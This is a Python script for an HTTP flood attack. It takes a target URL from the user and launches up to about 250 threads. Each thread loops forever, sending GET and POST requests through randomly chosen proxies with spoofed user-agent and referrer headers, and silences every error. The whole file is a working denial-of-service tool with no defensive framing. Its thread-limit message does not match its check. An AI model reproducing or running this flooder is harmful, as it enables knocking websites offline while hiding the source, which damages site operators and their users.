from requests import request
from threading import Thread
from random import choice
from colorama import Fore, Style
import os
os.system('color')

from data.spoof import get_proxies, USERAGENTS, REFERRERS

PROXIES = get_proxies()

def flood_url(URL: str) -> None:
    while True:
        try:
            #turn PROXIES into a list and choose a random one.
            proxy = choice(list(PROXIES))
            #send get request.
            r = request(
                method  = 'GET',
                url     = URL,
                headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
            ); r.close()
            print(f'{Fore.GREEN}Request sent{Style.RESET_ALL}, proxy: {proxy}')
            #send post request 10 times.
            for _ in range(10):
                r = request(
                    method  = 'POST',
                    url     = URL,
                    headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                    proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
                ); r.close()
                print(f'{Fore.GREEN}Request sent{Style.RESET_ALL}, proxy: {proxy}')
        except:
            pass

def start():
    print(f'{Fore.YELLOW}Proxies: {len(PROXIES)}\n{Style.RESET_ALL}')

    URL = input(f'{Fore.YELLOW}URL: {Style.RESET_ALL}')

    while True:
        threads = int(input(f'{Fore.YELLOW}Threads (1-250): {Style.RESET_ALL}'))

        if not threads > 251:
            break

        if not threads:
            threads = 250 ; break

        print(f'{Fore.RED}Thread limit is 100.{Style.RESET_ALL}\n')

    print(f'{Fore.YELLOW}Using {threads} threads.{Style.RESET_ALL}')
    print(f'{Fore.YELLOW}Flooding {URL} with {len(PROXIES)} proxies...{Style.RESET_ALL}\n')

    for _ in range(threads):
        Thread(target = flood_url, args = [URL]).start()